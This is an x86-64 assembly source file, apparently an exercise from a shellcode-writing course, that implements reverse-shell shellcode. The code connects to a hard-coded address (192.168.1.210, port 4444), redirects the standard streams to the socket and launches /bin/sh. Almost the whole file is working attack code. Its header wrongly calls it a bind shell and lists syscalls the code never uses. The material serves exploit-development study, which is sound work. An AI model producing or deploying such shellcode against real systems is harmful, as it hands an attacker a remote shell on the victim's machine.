; File: tcp_reverse_shell.nasm
; Author: Kevin Ren, originally professor Vivek of SLAE64
; Purpose: to demostrate a tcp bind shell shellcode in assembly 64

; Syscall needed: 
; 			1. Socket 41
;			2. Bind 49
; 			3. Listen 50
; 			4. Accept 43
; 			5. Close 3
; 			6. Execve 59
;			7. Dup2 33
; 			8. connect 42



global _start

section .text
_start: 
	; zeroing out all necessary
	xor rax, rax	 		
	xor rdi, rdi
	xor rsi, rsi
	xor rdx, rdx
	xor rbx, rbx
	xor rcx, rcx

	; server_sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41
	
	mov al, 41
	mov dil, 2
	mov sil, 1
;	mov dl, 0
	syscall

	; returned server_socket type int will be moved to rdi/dil register
	mov dil, al
	
	; set up the struct sockaddr_in server argument for connect using the stack
	; server.sin_family = AF_INET
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = INADDR_ANY
	; bzero(server.sin_zero, 8)
	; REMEMBER: if we are using the stack, we need to push in reverse order, b/c the stack grows high to low
	push rbx			; server.sin_zero (8 bytes)
	mov dword [rsp - 4], 0xd201a8c0 ; server.sin_addr (4 bytes) ip 192.168.1.210 this could be configurable
	mov word [rsp - 6], 0x5c11	; server.sin_port (2 bytes) port 4444 this could be configurable
	mov word [rsp - 8], 2		; server.sin_family (2 bytes)
	sub rsp, 8			; adjust stack

	; connect(server_sock, (struct sockaddr *)&server, sockaddr_len)
	mov al, 42
	mov rsi, rsp
	mov dl, 16
	syscall
	
	; dup2(comm_sock, 0/1/2)
	mov al, 33
	xor rsi, rsi
	syscall

	mov al, 33
	mov sil, 1
	syscall
	
	mov al, 33
	mov sil, 2
	syscall

	; execve	
	xor rax, rax
        mov al, 59              
        
        ; execve arguments
        push rbx                                        ; pushing NULL (zeros)
        mov rcx, 0x68732f2f6e69622f                     ; pushing /bin//sh in reverse hex
        push rcx 
        mov rdi, rsp                                    ; filename /bin//sh (1st arg)

        push rbx                                        ; pushing NULL
        push rdi                                        ; push address of /bin//sh00000000
        mov rsi, rsp                                    ; argv[/bin//sh00000000, 00000000] (2nd arg)

        push rbx                                        ; pushing NULL
        mov rdx, rsp                                    ; envp[00000000] (3rd arg)

        ; NOTE: could have just pushed NULL, /bin//sh [first arg], NULL [third arg], /bin//shNULL (first arg) [second arg]

        syscall

	
	
	
	
